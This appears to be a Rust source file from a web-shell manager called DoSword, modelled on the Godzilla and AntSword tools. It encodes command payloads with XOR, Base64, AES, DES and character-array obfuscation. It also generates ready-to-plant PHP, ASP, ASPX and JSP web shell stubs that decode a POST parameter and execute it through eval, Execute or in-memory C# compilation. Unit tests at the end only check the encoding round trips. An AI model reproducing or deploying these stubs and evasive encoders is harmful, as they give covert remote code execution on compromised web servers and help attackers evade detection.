//! 编码器体系：客户端载荷编码与服务端 stub 生成（哥斯拉风格）。
//!
//! 每种编码器负责两件事：
//!   1. `encode`：把协议代码编码为传输载荷（与服务端 stub 的解码逻辑对应）
//!   2. `stub`：生成指定语言（php / asp / aspx / jsp）的服务端脚本，
//!      内嵌由密码派生的密钥
//!
//! 密钥派生：`md5(password)` 的 hex（32 字符）。客户端与服务端自动一致，
//! 无需额外保存密钥。

use base64::Engine;
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
use md5::{Digest, Md5};

use crate::protocol::ProtocolError;

/// AES-128-CBC（复用为 ECB：零 IV 即 ECB 模式）。
type AesCbcEnc = cbc::Encryptor<aes::Aes128>;
type AesCbcDec = cbc::Decryptor<aes::Aes128>;
/// DES-ECB。
type DesEcbEnc = cbc::Encryptor<des::Des>;
type DesEcbDec = cbc::Decryptor<des::Des>;

/// 支持的脚本语言（stub 生成目标）。
pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];

/// 编码器：载荷编码 + stub 生成。
pub trait PayloadEncoder: Send + Sync {
    fn id(&self) -> &'static str;
    fn display_name(&self) -> &'static str;

    /// 由密码派生密钥（hex 字符串）。
    fn derive_key(&self, password: &str) -> String {
        md5_hex(password)
    }

    /// 客户端：编码协议代码为传输载荷。
    fn encode(&self, code: &str, password: &str) -> String;

    /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError>;
}

/// 编码器注册表。
pub struct EncoderRegistry {
    encoders: Vec<Box<dyn PayloadEncoder>>,
}

static GLOBAL_ENCODERS: std::sync::LazyLock<EncoderRegistry> =
    std::sync::LazyLock::new(EncoderRegistry::builtin);

impl EncoderRegistry {
    pub fn builtin() -> Self {
        Self {
            encoders: vec![
                Box::new(XorBase64Encoder),
                Box::new(Base64Encoder),
                Box::new(Aes128EcbEncoder),
                Box::new(Aes128CbcEncoder),
                Box::new(DesEcbEncoder),
                Box::new(CharEncoder),
                Box::new(PhpObfuscateEncoder),
            ],
        }
    }

    /// 全局单例（协议层取编码器用，避免每次构建）。
    pub fn global() -> &'static Self {
        &GLOBAL_ENCODERS
    }

    pub fn get(&self, id: &str) -> Option<&dyn PayloadEncoder> {
        self.encoders.iter().find(|encoder| encoder.id() == id).map(|b| b.as_ref())
    }

    pub fn list(&self) -> Vec<(String, String)> {
        let mut items: Vec<(String, String)> = self
            .encoders
            .iter()
            .map(|encoder| (encoder.id().to_string(), encoder.display_name().to_string()))
            .collect();
        items.sort_by(|a, b| a.0.cmp(&b.0));
        items
    }
}

pub fn md5_hex(value: &str) -> String {
    let digest = Md5::digest(value.as_bytes());
    format!("{digest:x}")
}

/// XOR + Base64 编码器（哥斯拉风格）。
pub struct XorBase64Encoder;

impl XorBase64Encoder {
    /// 逐字节循环异或。
    fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect()
    }
}

impl PayloadEncoder for XorBase64Encoder {
    fn id(&self) -> &'static str {
        "xor_base64"
    }

    fn display_name(&self) -> &'static str {
        "XOR_BASE64（异或混淆 + Base64）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored = Self::xor(code.as_bytes(), &key);
        base64::engine::general_purpose::STANDARD.encode(xored)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = self.derive_key(password);
        match language {
            "php" => Ok(format!(
                r#"<?php
// DoSword generated stub (xor_base64)
$k="{key}";
$d=@base64_decode($_POST['x']);
$r='';
for($i=0;$i<strlen($d);$i++){{$r.=$d[$i]^$k[$i%strlen($k)];}}
@eval($r);
"#
            )),
            "asp" => Ok(format!(
                r#"<%
' DoSword generated stub (xor_base64)
Const K = "{key}"
Function B64(d)
  Dim xml: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
  xml.DataType = "bin.base64"
  xml.Text = d
  B64 = xml.nodeTypedValue
End Function
Function X(d)
  Dim r, i
  r = ""
  For i = 1 To Len(d)
    r = r & Chr(Asc(Mid(d, i, 1)) Xor Asc(Mid(K, ((i - 1) Mod Len(K)) + 1, 1)))
  Next
  X = r
End Function
Execute X(B64(Request.Form("x")))
%>
"#
            )),
            "aspx" => Ok(format!(
                r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<script runat="server">
const string K = "{key}";
string X(string d) {{
  string r = "";
  for (int i = 0; i < d.Length; i++) r += (char)(d[i] ^ K[i % K.Length]);
  return r;
}}
void Run(string code) {{
  CSharpCodeProvider p = new CSharpCodeProvider();
  CompilerParameters prm = new CompilerParameters();
  prm.GenerateInMemory = true;
  CompilerResults res = p.CompileAssemblyFromSource(prm,
    "using System;public class T{{public static object E(){{" + code + "return null;}}}}");
  if (!res.Errors.HasErrors) {{
    object o = res.CompiledAssembly.CreateInstance("T");
    if (o != null) o.GetType().GetMethod("E").Invoke(o, new object[]{{}});
  }}
}}
</script>
<%
string x = Request["x"];
if (x != null) {{
  x = X(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x)));
  Run(x);
}}
%>
"#
            )),
            "jsp" => Ok(format!(
                r#"<%@ page contentType="text/html;charset=UTF-8" %>
<%!
String K = "{key}";
String X(String d) {{
  StringBuilder r = new StringBuilder();
  for (int i = 0; i < d.length(); i++) r.append((char)(d.charAt(i) ^ K.charAt(i % K.length())));
  return r.toString();
}}
%>
<%
String x = request.getParameter("x");
if (x != null) {{
  byte[] b = java.util.Base64.getDecoder().decode(x);
  String c = X(new String(b, "UTF-8"));
  try {{
    new javax.script.ScriptEngineManager().getEngineByName("javascript").eval(c);
  }} catch (Exception e) {{}}
}}
%>
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "XOR_BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

/// 裸 Base64 编码器（经典蚁剑形态，兼容现有 stub）。
pub struct Base64Encoder;

impl PayloadEncoder for Base64Encoder {
    fn id(&self) -> &'static str {
        "base64"
    }

    fn display_name(&self) -> &'static str {
        "BASE64（经典裸编码）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok("<?php @eval(base64_decode($_POST['x']));\n".to_string()),
            "asp" => Ok(
                "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
            ),
            "aspx" => Ok(
                "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System\" %>\n<%@ Import Namespace=\"Microsoft.CSharp\" %>\n<%@ Import Namespace=\"System.CodeDom.Compiler\" %>\n<script runat=\"server\">\nvoid Run(string code) {\n  CSharpCodeProvider p = new CSharpCodeProvider();\n  CompilerParameters prm = new CompilerParameters();\n  prm.GenerateInMemory = true;\n  CompilerResults res = p.CompileAssemblyFromSource(prm,\n    \"using System;public class T{public static object E(){\" + code + \"return null;}}\");\n  if (!res.Errors.HasErrors) {\n    object o = res.CompiledAssembly.CreateInstance(\"T\");\n    if (o != null) o.GetType().GetMethod(\"E\").Invoke(o, new object[]{});\n  }\n}\n</script>\n<% string x = Request[\"x\"]; if (x != null) { Run(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x))); } %>\n".to_string(),
            ),
            "jsp" => Ok(
                "<%@ page contentType=\"text/html;charset=UTF-8\" %>\n<%\nString x = request.getParameter(\"x\");\nif (x != null) {\n  byte[] b = java.util.Base64.getDecoder().decode(x);\n  try {\n    new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(new String(b, \"UTF-8\"));\n  } catch (Exception e) {}\n}\n%>\n".to_string(),
            ),
            other => Err(ProtocolError::NotSupported(format!(
                "BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 密钥派生（与 PHP openssl 侧完全一致）
// ---------------------------------------------------------------------------

/// AES-128 密钥：md5_hex 前 16 字符（16 字节 ASCII）。
pub fn aes_key(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[..16].try_into().expect("md5 hex 长度足够")
}

/// AES-CBC IV：md5_hex 后 16 字符。
pub fn aes_iv(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[16..].try_into().expect("md5 hex 长度足够")
}

/// DES 密钥：md5_hex 前 8 字符。
pub fn des_key(password: &str) -> [u8; 8] {
    let hex = md5_hex(password);
    hex.as_bytes()[..8].try_into().expect("md5 hex 长度足够")
}

pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
    AesCbcEnc::new(key.into(), &[0u8; 16].into())
        .encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
    AesCbcDec::new(key.into(), &[0u8; 16].into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("AES-ECB 解密失败".to_string()))
}

pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Vec<u8> {
    AesCbcEnc::new(key.into(), iv.into()).encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
    AesCbcDec::new(key.into(), iv.into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("AES-CBC 解密失败".to_string()))
}

pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
    DesEcbEnc::new(key.into(), &[0u8; 8].into())
        .encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, ProtocolError> {
    DesEcbDec::new(key.into(), &[0u8; 8].into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("DES-ECB 解密失败".to_string()))
}

// ---------------------------------------------------------------------------
// AES-128-ECB（自加密，密钥由密码 md5 派生并内嵌 stub）
// ---------------------------------------------------------------------------

pub struct Aes128EcbEncoder;

impl PayloadEncoder for Aes128EcbEncoder {
    fn id(&self) -> &'static str {
        "aes128_ecb"
    }

    fn display_name(&self) -> &'static str {
        "AES128_ECB（AES-128 加密 + Base64，自加密）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
        match language {
            "php" => Ok(format!(
                r#"<?php
// DoSword generated stub (aes128_ecb)
$k="{key}";
@eval(@openssl_decrypt($_POST['x'],'AES-128-ECB',$k));
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// AES-128-CBC（自加密，IV 取自 md5 后 16 字符）
// ---------------------------------------------------------------------------

pub struct Aes128CbcEncoder;

impl PayloadEncoder for Aes128CbcEncoder {
    fn id(&self) -> &'static str {
        "aes128_cbc"
    }

    fn display_name(&self) -> &'static str {
        "AES128_CBC（AES-128 加密 + Base64，自加密）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
        let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
        match language {
            "php" => Ok(format!(
                r#"<?php
// DoSword generated stub (aes128_cbc)
$k="{key}";
$i="{iv}";
@eval(@openssl_decrypt($_POST['x'],'AES-128-CBC',$k,0,$i));
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// DES-ECB（自加密，密钥 md5 前 8 字符）
// ---------------------------------------------------------------------------

pub struct DesEcbEncoder;

impl PayloadEncoder for DesEcbEncoder {
    fn id(&self) -> &'static str {
        "des"
    }

    fn display_name(&self) -> &'static str {
        "DES_ECB（DES 加密 + Base64，自加密）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&des_key(password)).into_owned();
        match language {
            "php" => Ok(format!(
                r#"<?php
// DoSword generated stub (des_ecb)
$k="{key}";
@eval(@openssl_decrypt($_POST['x'],'DES-ECB',$k));
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// CHAR：载荷为 chr() 数组拼接的混淆代码（stub 为裸 eval，混淆在载荷内）
// ---------------------------------------------------------------------------

pub struct CharEncoder;

impl PayloadEncoder for CharEncoder {
    fn id(&self) -> &'static str {
        "char"
    }

    fn display_name(&self) -> &'static str {
        "CHAR（字符数组混淆，无密钥）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        let bytes = code.as_bytes();
        let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
        format!("eval(implode('',array_map('chr',array({}))));", values.join(","))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok("<?php @eval($_POST['x']);\n".to_string()),
            other => Err(ProtocolError::NotSupported(format!(
                "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 CHAR 载荷还原原始代码（测试 / mock 用）。
pub fn char_decode(payload: &str) -> Result<String, ProtocolError> {
    let numbers = payload
        .split("array(")
        .nth(1)
        .and_then(|part| part.split(')').next())
        .ok_or_else(|| ProtocolError::ParseError("CHAR 载荷格式异常".to_string()))?;
    let bytes: Vec<u8> = numbers
        .split(',')
        .filter_map(|item| item.trim().parse::<u8>().ok())
        .collect();
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("CHAR 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// PHP_OBFUSCATE：base64 + 反转混淆（载荷自带解码，stub 为裸 eval）
// ---------------------------------------------------------------------------

pub struct PhpObfuscateEncoder;

impl PayloadEncoder for PhpObfuscateEncoder {
    fn id(&self) -> &'static str {
        "php_obfuscate"
    }

    fn display_name(&self) -> &'static str {
        "PHP_OBFUSCATE（base64+反转混淆，无密钥）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
        let reversed: String = b64.chars().rev().collect();
        format!("eval(base64_decode(strrev('{reversed}')));")
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok("<?php @eval($_POST['x']);\n".to_string()),
            other => Err(ProtocolError::NotSupported(format!(
                "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 OBFUSCATE 载荷还原原始代码（测试 / mock 用）。
pub fn obfuscate_decode(payload: &str) -> Result<String, ProtocolError> {
    let reversed = payload
        .split("strrev('")
        .nth(1)
        .and_then(|part| part.split("')").next())
        .ok_or_else(|| ProtocolError::ParseError("OBFUSCATE 载荷格式异常".to_string()))?;
    let b64: String = reversed.chars().rev().collect();
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(&b64)
        .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))?;
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_round_trip() {
        let key = md5_hex("secret").into_bytes();
        let original = b"hello dosword";
        let xored = XorBase64Encoder::xor(original, &key);
        assert_eq!(XorBase64Encoder::xor(&xored, &key), original);
    }

    #[test]
    fn xor_base64_encode_decodes_with_php_stub_key() {
        let encoder = XorBase64Encoder;
        let password = "secret";
        let code = "@ini_set(\"display_errors\",\"0\");echo 'hello';";
        let payload = encoder.encode(code, password);

        // 模拟服务端 stub 逻辑：base64 解码 → XOR 还原
        let key = encoder.derive_key(password);
        let key_bytes = key.into_bytes();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&payload)
            .unwrap();
        let restored = XorBase64Encoder::xor(&decoded, &key_bytes);
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn base64_encoder_is_plain() {
        let encoder = Base64Encoder;
        let payload = encoder.encode("echo 1;", "whatever");
        assert_eq!(
            String::from_utf8(
                base64::engine::general_purpose::STANDARD
                    .decode(&payload)
                    .unwrap()
            )
            .unwrap(),
            "echo 1;"
        );
    }

    #[test]
    fn stub_generation_all_languages() {
        for encoder in [&XorBase64Encoder as &dyn PayloadEncoder, &Base64Encoder as &dyn PayloadEncoder] {
            for language in STUB_LANGUAGES {
                let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                    panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
                });
                assert!(!stub.is_empty());
            }
        }
    }

    #[test]
    fn xor_stub_embeds_derived_key() {
        let stub = XorBase64Encoder.stub("php", "secret").unwrap();
        assert!(stub.contains(&md5_hex("secret")), "stub 应内嵌 md5 密钥");
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
    }

    #[test]
    fn unsupported_language_rejected() {
        let result = XorBase64Encoder.stub("python", "secret");
        assert!(result.is_err());
    }

    #[test]
    fn key_is_md5_hex() {
        assert_eq!(md5_hex("secret"), "5ebe2294ecd0e0f08eab7690d2a6ee69");
    }

    // --- 自加密编码器（AES / DES） ---

    #[test]
    fn aes_ecb_round_trip() {
        let encoder = Aes128EcbEncoder;
        let code = "@ini_set('display_errors','0');echo 1;";
        let payload = encoder.encode(code, "secret");
        // 载荷应为密文（不含明文特征）
        assert!(!payload.contains("@ini_set"));
        // 模拟 stub 解密：openssl 参数一致（key=md5hex 前16）
        let restored = aes_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn aes_cbc_round_trip() {
        let encoder = Aes128CbcEncoder;
        let code = "echo 'cbc';";
        let payload = encoder.encode(code, "secret");
        let restored = aes_cbc_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("secret"),
            &aes_iv("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn des_round_trip() {
        let encoder = DesEcbEncoder;
        let code = "echo 'des';";
        let payload = encoder.encode(code, "secret");
        let restored = des_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &des_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn wrong_password_aes_decrypt_fails() {
        let payload = Aes128EcbEncoder.encode("code", "secret");
        let result = aes_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("wrong"),
        );
        assert!(result.is_err(), "错误密码应解密失败");
    }

    #[test]
    fn aes_stub_embeds_key_not_password() {
        let stub = Aes128EcbEncoder.stub("php", "secret").unwrap();
        assert!(stub.contains("5ebe2294ecd0e0f0"), "stub 应内嵌 md5 派生密钥");
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
        assert!(stub.contains("openssl_decrypt"), "stub 应使用 openssl_decrypt");
    }

    // --- 混淆编码器（CHAR / OBFUSCATE） ---

    #[test]
    fn char_encode_and_decode() {
        let encoder = CharEncoder;
        let code = "@ini_set('x',1);";
        let payload = encoder.encode(code, "ignored");
        assert!(payload.starts_with("eval(implode('',array_map('chr',array("));
        assert_eq!(char_decode(&payload).unwrap(), code);
    }

    #[test]
    fn obfuscate_encode_and_decode() {
        let encoder = PhpObfuscateEncoder;
        let code = "@ini_set('x',1);echo 'obf';";
        let payload = encoder.encode(code, "ignored");
        assert!(!payload.contains("@ini_set"), "载荷不应含明文");
        assert_eq!(obfuscate_decode(&payload).unwrap(), code);
    }

    #[test]
    fn new_encoders_php_stub_only() {
        for encoder in [
            &Aes128EcbEncoder as &dyn PayloadEncoder,
            &Aes128CbcEncoder as &dyn PayloadEncoder,
            &DesEcbEncoder as &dyn PayloadEncoder,
            &CharEncoder as &dyn PayloadEncoder,
            &PhpObfuscateEncoder as &dyn PayloadEncoder,
        ] {
            assert!(encoder.stub("php", "secret").is_ok(), "{} php stub 应成功", encoder.id());
            assert!(
                encoder.stub("aspx", "secret").is_err(),
                "{} aspx 应提示不支持",
                encoder.id()
            );
        }
    }

    #[test]
    fn registry_lists_all_encoders() {
        let ids: Vec<String> = EncoderRegistry::builtin()
            .list()
            .into_iter()
            .map(|(id, _)| id)
            .collect();
        assert_eq!(
            ids,
            vec![
                "aes128_cbc",
                "aes128_ecb",
                "base64",
                "char",
                "des",
                "php_obfuscate",
                "xor_base64",
            ]
        );
    }
}
